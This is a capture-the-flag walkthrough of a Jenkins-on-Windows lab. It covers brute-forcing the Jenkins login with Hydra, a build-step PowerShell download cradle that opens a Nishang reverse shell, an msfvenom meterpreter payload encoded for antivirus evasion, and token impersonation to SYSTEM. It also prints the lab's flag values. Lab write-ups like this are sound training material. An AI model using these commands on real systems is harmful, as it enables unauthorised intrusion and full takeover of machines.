![](https://i.imgur.com/OwWppVP.png)  

In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access. 

Since this is a Windows application, we'll be using [Nishang](https://github.com/samratashok/nishang) to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)


## Recon

Nmap first as always :
```
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  tcpwrapped
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2023-05-04T19:47:29
|_Not valid after:  2023-11-03T19:47:29
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
MAC Address: 02:BB:98:B7:D2:3F (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
1   0.69 ms ip-10-10-12-34.eu-west-1.compute.internal (10.10.12.34)
```

So the post 80 does not have much information:

RIP Bruce Wayne

Donations to alfred@wayneenterprises.com are greatly appreciated. 

But port 8080 has a login form.


## Attack
I am going to use [Hydra](https://www.kali.org/tools/hydra/) with:
```
hydra -s 8080 10.10.12.34 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password" -L /usr/share/wordlists/dirbuster/apache-user-enum-1.0.txt -P /usr/share/wordlists/dirbuster/apache-user-enum-1.0.txt -t 10 -w 30
```

I know to attack  /j_acegi_security_check because I found it from the request via [Burpsuite](https://portswigger.net/)
And I get <font color=red> admin:admin</font>

Next the room tells me:

Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: 
```powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port ```


So I logged in
Went to
- My views
- click project
- Configure 
- scrolled down to the Build section and pasted the command
- powershell iex (New-Object Net.WebClient).DownloadString('http:// [ local ip]:[ local port for webserver]/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [local port] -Port [local port for netcat]
-  Apply and Save

Then I downloaded [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
On the same folder I opened two connections
The first was a local python server, so that the Jenkins know where to find the file. I did it with
`python3 -m http.server [local port for webserver]`

I also opened a connection with netcat to handle the target machine when the script gets executed
`nc [local ip] [local port for netcat]`

Then I went back to Jeckins and I pressed Build Now and got the connection on netcat.

Navigated to C:\Users\bruce\Desktop and got my flag `79007a09481963edf2e1321abd9ae2a0`
## Switching Shells

To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

Use msfvenom to create a Windows meterpreter reverse shell using the following payload:

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`  

This payload generates an encoded x86-64 reverse TCP meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

After creating this payload, download it to the machine using the same method in the previous step:

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"`

Before running this program, ensure the handler is set up in Metasploit:

`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run`  

﻿This step uses the Metasploit handler to receive the incoming connection from your reverse shell. Once this is running, enter this command to start the reverse shell

`Start-Process "shell-name.exe"`

This should spawn a meterpreter shell for you!


So I typed `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[local ip] LPORT=[local new port] -f exe -o [shell name].exe`

Next on the compromised machine I typed
`powershell "(New-Object System.Net.WebClient).Downloadfile('http://[local ip]:[local port for webserver]/[shell name].exe','[shell name].exe')"`

The machine gets the shell.exe from the local server.
Next I open Metasploit and type
`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST [local ip] set LPORT [local new port] run`

And then on the machine I typed `Start-Process "[shell name].exe"`
And got a connection on the Metasploit.
## Privilege Escalation

Now that we have initial access, let's use token impersonation to gain system access.

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

- User SIDs(security identifier)
- Group SIDs
- Privileges

Amongst other things. More detailed information can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

There are two types of access tokens:

- Primary access tokens: those associated with a user account that are generated on log on
- Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

- SecurityAnonymous: current user/client cannot impersonate another user/client
- SecurityIdentification: current user/client can get the identity and privileges of a client but cannot impersonate the client
- SecurityImpersonation: current user/client can impersonate the client's security context on the local system
- SecurityDelegation: current user/client can impersonate the client's security context on a remote system

Where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

There's more reading [here](https://www.exploit-db.com/papers/42556).

You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability.

Enter: _load incognito_ to load the incognito module in Metasploit. Please note that you may need to use the _use incognito_ command if the previous command doesn't work. Also, ensure that your Metasploit is up to date.

To check which tokens are available, enter the _list_tokens -g_. We can see that the _BUILTIN\Administrators_ token is available.

Use the _impersonate_token "BUILTIN\Administrators"_ command to impersonate the Administrators' token. What is the output when you run the _getuid_ command?
`NT AUTHORITY\SYSTEM`

Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).

Ensure that you migrate to a process with correct permissions (the above question's answer). The safest process to pick is the services.exe process. First, use the _ps_ command to view processes and find the PID of the services.exe process. Migrate to this process using the command _migrate PID-OF-PROCESS_

Read the root.txt file located at `C:\Windows\System32\config`
`dff0f748678f280250f25a45b8046b4a`


